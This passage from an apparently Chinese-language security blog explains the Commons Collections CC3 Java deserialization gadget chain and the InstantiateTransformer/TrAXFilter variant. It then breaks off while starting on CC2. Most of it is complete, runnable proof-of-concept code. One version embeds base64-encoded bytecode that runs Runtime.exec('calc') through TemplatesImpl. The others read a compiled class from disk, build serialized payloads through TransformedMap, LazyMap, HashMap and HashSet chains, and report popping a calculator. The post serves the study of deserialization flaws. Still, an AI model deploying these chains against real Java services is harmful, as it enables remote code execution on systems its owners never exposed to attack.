org.apache.commons.collections.functors.InvokerTransformer; import org.apache.commons.collections.Transformer; public class Main{ public static void main(String[] args) throws Exception { byte[] code = Base64.getDecoder().decode(\u0026#34;xxx\u0026#34;); TemplatesImpl ctf = new TemplatesImpl(); setFieldValue(ctf,\u0026#34;_name\u0026#34;,\u0026#34;fupanc\u0026#34;); setFieldValue(ctf,\u0026#34;_bytecodes\u0026#34;,new byte[][]{code}); setFieldValue(ctf, \u0026#34;_class\u0026#34;, null); setFieldValue(ctf, \u0026#34;_tfactory\u0026#34;, new TransformerFactoryImpl()); Transformer[] chainPart = new Transformer[]{new ConstantTransformer(ctf),new InvokerTransformer(\u0026#34;newTransformer\u0026#34;,null,null)}; Transformer chain = new ChainedTransformer(chainPart); } public static void setFieldValue(Object obj,String fieldName,Object value) throws Exception{ Field field = obj.getClass().getDeclaredField(fieldName); field.setAccessible(true); field.set(obj,value); } } 现在就是看如何接入了CC链了\n结合CC1 测试环境： commons-collections 3.2.1 JDK 8u65 CC3（TransformedMap链） POC：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 package org.example; import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl; import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl; import java.lang.reflect.Field; import java.lang.reflect.Constructor; import java.lang.annotation.Retention; import java.lang.Class; import java.util.Base64; import java.util.Map; import java.util.HashMap; import org.apache.commons.collections.functors.ChainedTransformer; import org.apache.commons.collections.functors.ConstantTransformer; import org.apache.commons.collections.functors.InvokerTransformer; import org.apache.commons.collections.Transformer; import org.apache.commons.collections.map.TransformedMap; import java.io.ObjectOutputStream; import java.io.ObjectInputStream; import java.io.FileOutputStream; import java.io.FileInputStream; public class Main{ public static void main(String[] args) throws Exception { byte[] code = Base64.getDecoder().decode(\u0026#34;yv66vgAAADQALAoABgAeCgAfACAIACEKAB8AIgcAIwcAJAEABjxpbml0PgEAAygpVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBABJMb2NhbFZhcmlhYmxlVGFibGUBAAR0aGlzAQASTG9yZy9leGFtcGxlL1Rlc3Q7AQAKRXhjZXB0aW9ucwcAJQEACXRyYW5zZm9ybQEAcihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEACGRvY3VtZW50AQAtTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007AQAIaGFuZGxlcnMBAEJbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjsHACYBAKYoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQAIaXRlcmF0b3IBADVMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9kdG0vRFRNQXhpc0l0ZXJhdG9yOwEAB2hhbmRsZXIBAEFMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOwEAClNvdXJjZUZpbGUBAAlUZXN0LmphdmEMAAcACAcAJwwAKAApAQAEY2FsYwwAKgArAQAQb3JnL2V4YW1wbGUvVGVzdAEAQGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ydW50aW1lL0Fic3RyYWN0VHJhbnNsZXQBABNqYXZhL2lvL0lPRXhjZXB0aW9uAQA5Y29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL1RyYW5zbGV0RXhjZXB0aW9uAQARamF2YS9sYW5nL1J1bnRpbWUBAApnZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7AQAEZXhlYwEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwAhAAUABgAAAAAAAwABAAcACAACAAkAAABAAAIAAQAAAA4qtwABuAACEgO2AARXsQAAAAIACgAAAA4AAwAAAAoABAALAA0ADAALAAAADAABAAAADgAMAA0AAAAOAAAABAABAA8AAQAQABEAAgAJAAAAPwAAAAMAAAABsQAAAAIACgAAAAYAAQAAAA8ACwAAACAAAwAAAAEADAANAAAAAAABABIAEwABAAAAAQAUABUAAgAOAAAABAABABYAAQAQABcAAgAJAAAASQAAAAQAAAABsQAAAAIACgAAAAYAAQAAABIACwAAACoABAAAAAEADAANAAAAAAABABIAEwABAAAAAQAYABkAAgAAAAEAGgAbAAMADgAAAAQAAQAWAAEAHAAAAAIAHQ==\u0026#34;); TemplatesImpl ctf = new TemplatesImpl(); setFieldValue(ctf,\u0026#34;_name\u0026#34;,\u0026#34;fupanc\u0026#34;); setFieldValue(ctf,\u0026#34;_bytecodes\u0026#34;,new byte[][]{code}); setFieldValue(ctf, \u0026#34;_class\u0026#34;, null); setFieldValue(ctf, \u0026#34;_tfactory\u0026#34;, new TransformerFactoryImpl()); Transformer[] chainPart = new Transformer[]{new ConstantTransformer(ctf),new InvokerTransformer(\u0026#34;newTransformer\u0026#34;,null,null)}; Transformer chain = new ChainedTransformer(chainPart); Map hashMap = new HashMap(); hashMap.put(\u0026#34;value\u0026#34;,\u0026#34;xxxx\u0026#34;); Map outerMap = TransformedMap.decorate(hashMap,null,chain); Constructor constructor1 = Class.forName(\u0026#34;sun.reflect.annotation.AnnotationInvocationHandler\u0026#34;).getDeclaredConstructor(Class.class,Map.class); constructor1.setAccessible(true); Object o = constructor1.newInstance(Retention.class,outerMap); ObjectOutputStream out = new ObjectOutputStream(new FileOutputStream(\u0026#34;ser.ser\u0026#34;)); out.writeObject(o); out.close(); ObjectInputStream in = new ObjectInputStream(new FileInputStream(\u0026#34;ser.ser\u0026#34;)); in.readObject(); in.close(); } public static void setFieldValue(Object obj,String fieldName,Object value) throws Exception{ Field field = obj.getClass().getDeclaredField(fieldName); field.setAccessible(true); field.set(obj,value); } } 成功弹出计算机，其实就是将前面的链式执行命令改了一下。\n这里要说明一个东西，就是利用链的InvokerTransformer初始化那里，可以和前面的CC1对比一下：\n如果 paramTypes 和 args 是 null，它们表示该方法没有参数。而如果它们是 new Class[]{null} 和 new Object[]{null}，这实际上是表示该方法有一个参数，但是该参数的类型和值都是 null，这种情况很可能导致方法调用失败，因为实际调用的方法没有参数，而代码却试图用一个 null 类型和 null 值进行调用。\n所以上面代码需要直接用两个null表示无参数的方法\nCC3（LazyMap链） POC（前面用的base64，这里就用IO读文件）：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 package org.example; import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl; import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl; import java.lang.reflect.Field; import java.lang.reflect.Constructor; import java.lang.annotation.Retention; import java.lang.Class; import java.lang.reflect.InvocationHandler; import java.util.Map; import java.util.HashMap; import org.apache.commons.collections.functors.ChainedTransformer; import org.apache.commons.collections.functors.ConstantTransformer; import org.apache.commons.collections.functors.InvokerTransformer; import org.apache.commons.collections.Transformer; import org.apache.commons.collections.map.LazyMap; import java.io.ObjectOutputStream; import java.io.ObjectInputStream; import java.io.FileOutputStream; import java.io.FileInputStream; import java.nio.file.Files; import java.nio.file.Paths; import java.lang.reflect.InvocationHandler; import java.lang.reflect.Proxy; public class Main { public static void main(String[] args) throws Exception { byte[] code = Files.readAllBytes(Paths.get(\u0026#34;D:\\\\maven_text\\\\maven1_text\\\\target\\\\test-classes\\\\org\\\\example\\\\Test.class\u0026#34;)); TemplatesImpl ctf = new TemplatesImpl(); setFieldValue(ctf,\u0026#34;_name\u0026#34;,\u0026#34;fupanc\u0026#34;); setFieldValue(ctf,\u0026#34;_bytecodes\u0026#34;,new byte[][]{code}); setFieldValue(ctf, \u0026#34;_class\u0026#34;, null); setFieldValue(ctf, \u0026#34;_tfactory\u0026#34;, new TransformerFactoryImpl()); Transformer[] chainPart = new Transformer[]{new ConstantTransformer(ctf),new InvokerTransformer(\u0026#34;newTransformer\u0026#34;,null,null)}; Transformer chain = new ChainedTransformer(chainPart); Map hashMap = new HashMap(); Map outerMap = LazyMap.decorate(hashMap,chain); Constructor con = Class.forName(\u0026#34;sun.reflect.annotation.AnnotationInvocationHandler\u0026#34;).getDeclaredConstructor(Class.class,Map.class); con.setAccessible(true); InvocationHandler proxy = (InvocationHandler) con.newInstance(Retention.class,outerMap); Map proxyMap = (Map)Proxy.newProxyInstance(LazyMap.class.getClassLoader(),LazyMap.class.getInterfaces(),proxy); Object o = con.newInstance(Retention.class,proxyMap); ObjectOutputStream out = new ObjectOutputStream(new FileOutputStream(\u0026#34;ser.ser\u0026#34;)); out.writeObject(o); out.close(); ObjectInputStream in = new ObjectInputStream(new FileInputStream(\u0026#34;ser.ser\u0026#34;)); in.readObject(); in.close(); } public static void setFieldValue(Object obj,String fieldName,Object value) throws Exception{ Field field = obj.getClass().getDeclaredField(fieldName); field.setAccessible(true); field.set(obj,value); } } 成功弹出计算机。\n局限 也就是CC1的局限，在JDK 8u71后就不能再使用了。\n结合CC6 测试环境： commons-collections 3.2.1 JDK 8u411 CC3（HashMap链） POC：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 package org.example; import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl; import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl; import java.lang.reflect.Field; import java.util.Map; import java.util.HashMap; import org.apache.commons.collections.functors.ChainedTransformer; import org.apache.commons.collections.functors.ConstantTransformer; import org.apache.commons.collections.functors.InvokerTransformer; import org.apache.commons.collections.Transformer; import org.apache.commons.collections.keyvalue.TiedMapEntry; import org.apache.commons.collections.map.LazyMap; import java.io.ObjectOutputStream; import java.io.ObjectInputStream; import java.io.FileOutputStream; import java.io.FileInputStream; import java.nio.file.Files; import java.nio.file.Paths; public class Main{ public static void main(String[] args) throws Exception { byte[] code = Files.readAllBytes(Paths.get(\u0026#34;D:\\\\maven_text\\\\maven1_text\\\\target\\\\test-classes\\\\org\\\\example\\\\Test.class\u0026#34;)); TemplatesImpl ctf = new TemplatesImpl(); setFieldValue(ctf,\u0026#34;_name\u0026#34;,\u0026#34;fupanc\u0026#34;); setFieldValue(ctf,\u0026#34;_bytecodes\u0026#34;,new byte[][]{code}); setFieldValue(ctf, \u0026#34;_class\u0026#34;, null); setFieldValue(ctf, \u0026#34;_tfactory\u0026#34;, new TransformerFactoryImpl()); Transformer[] fakeTransformer = new Transformer[]{new ConstantTransformer(1)}; Transformer[] chainPart = new Transformer[]{new ConstantTransformer(ctf),new InvokerTransformer(\u0026#34;newTransformer\u0026#34;,null,null)}; Transformer chain = new ChainedTransformer(fakeTransformer); Map hashMap = new HashMap(); Map lazy = LazyMap.decorate(hashMap,chain); TiedMapEntry outerMap = new TiedMapEntry(lazy,\u0026#34;fupanc\u0026#34;); HashMap o = new HashMap(); o.put(outerMap,\u0026#34;xxxx\u0026#34;); hashMap.remove(\u0026#34;fupanc\u0026#34;); Field field1 = ChainedTransformer.class.getDeclaredField(\u0026#34;iTransformers\u0026#34;); field1.setAccessible(true); field1.set(chain,chainPart); ObjectOutputStream out = new ObjectOutputStream(new FileOutputStream(\u0026#34;ser.ser\u0026#34;)); out.writeObject(o); out.close(); ObjectInputStream in = new ObjectInputStream(new FileInputStream(\u0026#34;ser.ser\u0026#34;)); in.readObject(); in.close(); } public static void setFieldValue(Object obj,String fieldName,Object value) throws Exception{ Field field = obj.getClass().getDeclaredField(fieldName); field.setAccessible(true); field.set(obj,value); } } 成功弹出计算机。\nCC3（HashSet链） 和HashMap差不多，POC如下：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 package org.example; import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl; import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl; import java.lang.reflect.Field; import java.util.Map; import java.util.HashMap; import java.util.HashSet; import org.apache.commons.collections.functors.ChainedTransformer; import org.apache.commons.collections.functors.ConstantTransformer; import org.apache.commons.collections.functors.InvokerTransformer; import org.apache.commons.collections.Transformer; import org.apache.commons.collections.keyvalue.TiedMapEntry; import org.apache.commons.collections.map.LazyMap; import java.io.ObjectOutputStream; import java.io.ObjectInputStream; import java.io.FileOutputStream; import java.io.FileInputStream; import java.nio.file.Files; import java.nio.file.Paths; public class Main{ public static void main(String[] args) throws Exception { byte[] code = Files.readAllBytes(Paths.get(\u0026#34;D:\\\\maven_text\\\\maven1_text\\\\target\\\\test-classes\\\\org\\\\example\\\\Test.class\u0026#34;)); TemplatesImpl ctf = new TemplatesImpl(); setFieldValue(ctf,\u0026#34;_name\u0026#34;,\u0026#34;fupanc\u0026#34;); setFieldValue(ctf,\u0026#34;_bytecodes\u0026#34;,new byte[][]{code}); setFieldValue(ctf, \u0026#34;_class\u0026#34;, null); setFieldValue(ctf, \u0026#34;_tfactory\u0026#34;, new TransformerFactoryImpl()); Transformer[] fakeTransformer = new Transformer[]{new ConstantTransformer(1)}; Transformer[] chainPart = new Transformer[]{new ConstantTransformer(ctf),new InvokerTransformer(\u0026#34;newTransformer\u0026#34;,null,null)}; Transformer chain = new ChainedTransformer(fakeTransformer); Map hashMap = new HashMap(); Map lazy = LazyMap.decorate(hashMap,chain); TiedMapEntry outerMap = new TiedMapEntry(lazy,\u0026#34;fupanc\u0026#34;); HashSet hash = new HashSet(); hash.add(outerMap); hashMap.remove(\u0026#34;fupanc\u0026#34;); Field field1 = ChainedTransformer.class.getDeclaredField(\u0026#34;iTransformers\u0026#34;); field1.setAccessible(true); field1.set(chain,chainPart); ObjectOutputStream out = new ObjectOutputStream(new FileOutputStream(\u0026#34;ser.ser\u0026#34;)); out.writeObject(hash); out.close(); ObjectInputStream in = new ObjectInputStream(new FileInputStream(\u0026#34;ser.ser\u0026#34;)); in.readObject(); in.close(); } public static void setFieldValue(Object obj,String fieldName,Object value) throws Exception{ Field field = obj.getClass().getDeclaredField(fieldName); field.setAccessible(true); field.set(obj,value); } } InstantiateTransformer 测试环境： commons-collections 3.2.1 JDK 8u65 分析 ysoserial的CC3的POC没有用InvokerTransformer来执行newTransformer方法，而是用的InstantiateTransformer类： InstantiateTransformer类位于org.apache.commons.collections.functors.InstantiateTransformer，\n来看这个类用到的源码\n构造方法：\ntransform方法：\n可以看到这里的transform方法就是可以实例化一个类的。\n继续看ysoserial的利用链：\n1 2 3 4 5 Transformer[] transformers = new Transformer[] { new ConstantTransformer(TrAXFilter.class), new InstantiateTransformer( new Class[] { Templates.class }, new Object[] { templatesImpl } )}; 它前面传入了一个TrAXFilter.class，这个TrAXFilter类位置是com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter。\n在TrAXFilter类中，有地方调用了newTransformer()方法： 这也就是在ysoserial利用链中传入Templates.class的原因（Templates接口类位于javax.xml.transform.Templates），现在大概就清楚了，\n只要我们将一个设置好了的TemplatesImpl类赋值给一个变量，再将那个变量传进去当做TrAXFilter的参数变量templates的值，这样就会自然调用到TemplatesImpl类的newTransformer()方法，还是简单给个代码，就像如下：\n1 2 3 4 5 6 7 8 byte[] code = Files.readAllBytes(Paths.get(\u0026#34;D:\\\\java_text\\\\java-1\\\\out\\\\production\\\\java-1\\\\Test.class\u0026#34;)); TemplatesImpl templatesImpl = new TemplatesImpl(); setFieldValue(templatesImpl,\u0026#34;_name\u0026#34;,\u0026#34;fupanc\u0026#34;); setFieldValue(templatesImpl,\u0026#34;_bytecodes\u0026#34;,new byte[][]{code}); setFieldValue(templatesImpl, \u0026#34;_class\u0026#34;, null); setFieldValue(templatesImpl, \u0026#34;_tfactory\u0026#34;, new TransformerFactoryImpl()); Transformer[] chainPart = new Transformer[]{new ConstantTransformer(TrAXFilter.class),new InstantiateTransformer(new Class[]{Templates.class},new Object[]{templatesImpl})}; 就是如上，这样InstantiateTransformer的transformer()方法就可以在获取TrAXFilter类的构造方法后再调用newInstance()方法将这个TrAXFilter类实例化，在实例化的过程中，自然就会调用TemplatesImpl的newTransformer()方法：\n那么现在就可以尝试构造了。\nPOC 结合CC1 CC1的TransformedMap链：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 package org.example; import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl; import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl; import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter; import java.lang.reflect.Field; import java.lang.reflect.Constructor; import java.lang.annotation.Retention; import javax.xml.transform.Templates; import java.lang.Class; import java.util.Map; import java.util.HashMap; import org.apache.commons.collections.functors.InstantiateTransformer; import org.apache.commons.collections.functors.ChainedTransformer; import org.apache.commons.collections.functors.ConstantTransformer; import org.apache.commons.collections.Transformer; import org.apache.commons.collections.map.TransformedMap; import java.io.ObjectOutputStream; import java.io.ObjectInputStream; import java.io.FileOutputStream; import java.io.FileInputStream; import java.nio.file.Files; import java.nio.file.Paths; public class Main{ public static void main(String[] args) throws Exception { byte[] code = Files.readAllBytes(Paths.get(\u0026#34;D:\\\\maven_text\\\\maven1_text\\\\target\\\\test-classes\\\\org\\\\example\\\\Test.class\u0026#34;)); TemplatesImpl templatesImpl = new TemplatesImpl(); setFieldValue(templatesImpl,\u0026#34;_name\u0026#34;,\u0026#34;fupanc\u0026#34;); setFieldValue(templatesImpl,\u0026#34;_bytecodes\u0026#34;,new byte[][]{code}); setFieldValue(templatesImpl, \u0026#34;_class\u0026#34;, null); setFieldValue(templatesImpl, \u0026#34;_tfactory\u0026#34;, new TransformerFactoryImpl()); Transformer[] chainPart = new Transformer[]{new ConstantTransformer(TrAXFilter.class),new InstantiateTransformer(new Class[]{Templates.class},new Object[]{templatesImpl})}; Transformer chain = new ChainedTransformer(chainPart); Map hashMap = new HashMap(); hashMap.put(\u0026#34;value\u0026#34;,\u0026#34;xxxx\u0026#34;); Map outerMap = TransformedMap.decorate(hashMap,null,chain); Constructor constructor1 = Class.forName(\u0026#34;sun.reflect.annotation.AnnotationInvocationHandler\u0026#34;).getDeclaredConstructor(Class.class,Map.class); constructor1.setAccessible(true); Object o = constructor1.newInstance(Retention.class,outerMap); ObjectOutputStream out = new ObjectOutputStream(new FileOutputStream(\u0026#34;ser.ser\u0026#34;)); out.writeObject(o); out.close(); ObjectInputStream in = new ObjectInputStream(new FileInputStream(\u0026#34;ser.ser\u0026#34;)); in.readObject(); in.close(); } public static void setFieldValue(Object obj,String fieldName,Object value) throws Exception{ Field field = obj.getClass().getDeclaredField(fieldName); field.setAccessible(true); field.set(obj,value); } } 成功弹计算机。\nCC1的LazyMap链：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 package org.example; import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl; import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl; import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter; import java.lang.reflect.Field; import java.lang.reflect.Constructor; import java.lang.annotation.Retention; import java.lang.reflect.InvocationHandler; import java.lang.reflect.Proxy; import javax.xml.transform.Templates; import java.lang.Class; import java.util.Map; import java.util.HashMap; import org.apache.commons.collections.functors.InstantiateTransformer; import org.apache.commons.collections.functors.ChainedTransformer; import org.apache.commons.collections.functors.ConstantTransformer; import org.apache.commons.collections.Transformer; import org.apache.commons.collections.map.LazyMap; import java.io.ObjectOutputStream; import java.io.ObjectInputStream; import java.io.FileOutputStream; import java.io.FileInputStream; import java.nio.file.Files; import java.nio.file.Paths; public class Main { public static void main(String[] args) throws Exception { byte[] code = Files.readAllBytes(Paths.get(\u0026#34;D:\\\\maven_text\\\\maven1_text\\\\target\\\\test-classes\\\\org\\\\example\\\\Test.class\u0026#34;)); TemplatesImpl ctf = new TemplatesImpl(); setFieldValue(ctf,\u0026#34;_name\u0026#34;,\u0026#34;fupanc\u0026#34;); setFieldValue(ctf,\u0026#34;_bytecodes\u0026#34;,new byte[][]{code}); setFieldValue(ctf, \u0026#34;_class\u0026#34;, null); setFieldValue(ctf, \u0026#34;_tfactory\u0026#34;, new TransformerFactoryImpl()); Transformer[] chainPart = new Transformer[]{new ConstantTransformer(TrAXFilter.class),new InstantiateTransformer(new Class[]{Templates.class},new Object[]{ctf})}; Transformer chain = new ChainedTransformer(chainPart); Map hashMap = new HashMap(); Map outerMap = LazyMap.decorate(hashMap,chain); Constructor con = Class.forName(\u0026#34;sun.reflect.annotation.AnnotationInvocationHandler\u0026#34;).getDeclaredConstructor(Class.class,Map.class); con.setAccessible(true); InvocationHandler proxy = (InvocationHandler) con.newInstance(Retention.class,outerMap); Map proxyMap = (Map)Proxy.newProxyInstance(LazyMap.class.getClassLoader(),LazyMap.class.getInterfaces(),proxy); Object o = con.newInstance(Retention.class,proxyMap); ObjectOutputStream out = new ObjectOutputStream(new FileOutputStream(\u0026#34;ser.ser\u0026#34;)); out.writeObject(o); out.close(); ObjectInputStream in = new ObjectInputStream(new FileInputStream(\u0026#34;ser.ser\u0026#34;)); in.readObject(); in.close(); } public static void setFieldValue(Object obj,String fieldName,Object value) throws Exception{ Field field = obj.getClass().getDeclaredField(fieldName); field.setAccessible(true); field.set(obj,value); } } 成功弹计算机\n结合CC6 HashMap链的POC：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 package org.example; import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl; import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl; import java.lang.reflect.Field; import java.util.Map; import java.util.HashMap; import org.apache.commons.collections.functors.ChainedTransformer; import org.apache.commons.collections.functors.ConstantTransformer; import org.apache.commons.collections.functors.InvokerTransformer; import org.apache.commons.collections.Transformer; import org.apache.commons.collections.keyvalue.TiedMapEntry; import org.apache.commons.collections.map.LazyMap; import org.apache.commons.collections.functors.InstantiateTransformer; import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter; import javax.xml.transform.Templates; import java.io.ObjectOutputStream; import java.io.ObjectInputStream; import java.io.FileOutputStream; import java.io.FileInputStream; import java.nio.file.Files; import java.nio.file.Paths; public class Main{ public static void main(String[] args) throws Exception { byte[] code = Files.readAllBytes(Paths.get(\u0026#34;D:\\\\maven_text\\\\maven1_text\\\\target\\\\test-classes\\\\org\\\\example\\\\Test.class\u0026#34;)); TemplatesImpl ctf = new TemplatesImpl(); setFieldValue(ctf,\u0026#34;_name\u0026#34;,\u0026#34;fupanc\u0026#34;); setFieldValue(ctf,\u0026#34;_bytecodes\u0026#34;,new byte[][]{code}); setFieldValue(ctf, \u0026#34;_class\u0026#34;, null); setFieldValue(ctf, \u0026#34;_tfactory\u0026#34;, new TransformerFactoryImpl()); Transformer[] fakeTransformer = new Transformer[]{new ConstantTransformer(1)}; Transformer[] chainPart = new Transformer[]{new ConstantTransformer(TrAXFilter.class),new InstantiateTransformer(new Class[]{Templates.class},new Object[]{ctf})}; Transformer chain = new ChainedTransformer(fakeTransformer); Map hashMap = new HashMap(); Map lazy = LazyMap.decorate(hashMap,chain); TiedMapEntry outerMap = new TiedMapEntry(lazy,\u0026#34;fupanc\u0026#34;); HashMap o = new HashMap(); o.put(outerMap,\u0026#34;xxxx\u0026#34;); hashMap.remove(\u0026#34;fupanc\u0026#34;); Field field1 = ChainedTransformer.class.getDeclaredField(\u0026#34;iTransformers\u0026#34;); field1.setAccessible(true); field1.set(chain,chainPart); ObjectOutputStream out = new ObjectOutputStream(new FileOutputStream(\u0026#34;ser.ser\u0026#34;)); out.writeObject(o); out.close(); ObjectInputStream in = new ObjectInputStream(new FileInputStream(\u0026#34;ser.ser\u0026#34;)); in.readObject(); in.close(); } public static void setFieldValue(Object obj,String fieldName,Object value) throws Exception{ Field field = obj.getClass().getDeclaredField(fieldName); field.setAccessible(true); field.set(obj,value); } } 成功弹计算机\nHashSet链的POC：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 package org.example; import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl; import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl; import java.lang.reflect.Field; import java.util.Map; import java.util.HashMap; import java.util.HashSet; import org.apache.commons.collections.functors.ChainedTransformer; import org.apache.commons.collections.functors.ConstantTransformer; import org.apache.commons.collections.Transformer; import org.apache.commons.collections.keyvalue.TiedMapEntry; import org.apache.commons.collections.map.LazyMap; import org.apache.commons.collections.functors.InstantiateTransformer; import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter; import javax.xml.transform.Templates; import java.io.ObjectOutputStream; import java.io.ObjectInputStream; import java.io.FileOutputStream; import java.io.FileInputStream; import java.nio.file.Files; import java.nio.file.Paths; public class Main{ public static void main(String[] args) throws Exception { byte[] code = Files.readAllBytes(Paths.get(\u0026#34;D:\\\\maven_text\\\\maven1_text\\\\target\\\\test-classes\\\\org\\\\example\\\\Test.class\u0026#34;)); TemplatesImpl ctf = new TemplatesImpl(); setFieldValue(ctf,\u0026#34;_name\u0026#34;,\u0026#34;fupanc\u0026#34;); setFieldValue(ctf,\u0026#34;_bytecodes\u0026#34;,new byte[][]{code}); setFieldValue(ctf, \u0026#34;_class\u0026#34;, null); setFieldValue(ctf, \u0026#34;_tfactory\u0026#34;, new TransformerFactoryImpl()); Transformer[] fakeTransformer = new Transformer[]{new ConstantTransformer(1)}; Transformer[] chainPart = new Transformer[]{new ConstantTransformer(TrAXFilter.class),new InstantiateTransformer(new Class[]{Templates.class},new Object[]{ctf})}; Transformer chain = new ChainedTransformer(fakeTransformer); Map hashMap = new HashMap(); Map lazy = LazyMap.decorate(hashMap,chain); TiedMapEntry outerMap = new TiedMapEntry(lazy,\u0026#34;fupanc\u0026#34;); HashSet o = new HashSet(); o.add(outerMap); hashMap.remove(\u0026#34;fupanc\u0026#34;); Field field1 = ChainedTransformer.class.getDeclaredField(\u0026#34;iTransformers\u0026#34;); field1.setAccessible(true); field1.set(chain,chainPart); ObjectOutputStream out = new ObjectOutputStream(new FileOutputStream(\u0026#34;ser.ser\u0026#34;)); out.writeObject(o); out.close(); ObjectInputStream in = new ObjectInputStream(new FileInputStream(\u0026#34;ser.ser\u0026#34;)); in.readObject(); in.close(); } public static void setFieldValue(Object obj,String fieldName,Object value) throws Exception{ Field field = obj.getClass().getDeclaredField(fieldName); field.setAccessible(true); field.set(obj,value); } } 好处 首先就是在利用POC的时候一定要注意java版本的问题，结合CC6的基本在java7和java8都通杀。\n对于使用InstantiateTransformer类，当不允许使用InvokerTransformer类的时候就可以使用这个。\n","date":"2025-01-22T13:50:34+08:00","permalink":"https://fupanc-w1n.github.io/p/cc3/","title":"CC3"},{"content":"CC2 common-collection4 官方认为旧的旧的common-collection有一些结构和API设计上的问题，但修复这些问题会产生大量不能向前兼容的改动。于是推出的common-collection4不再认为是一个用来替换common-collection的新版本，而是一个新的包。\n两者的命名空间不冲突，可以共存在同一个项目中。\n在common-collection4-4.0下，依旧能利用common-collection-3.2.1的调用链，只是换了个包名而已。\n依赖改成如下即可：\n1 2 3 4 5 \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;org.apache.commons\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;commons-collections4\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;4.0\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; 针对common-collections4，ysoserial也是给出了两条反序列化调用链，也就是cc2和cc4，这里就讲讲CC2。\n前置知识 测试环境： commons-collections4.0 JDK 8u411 CC2有利用到javassist，所以这里需要有javassist的前置知识。\n需要了解的类 PriorityQueue 这个类位于java.util.PriorityQueue\nPriorityQueue 优先级队列是基于优先级堆（a priority 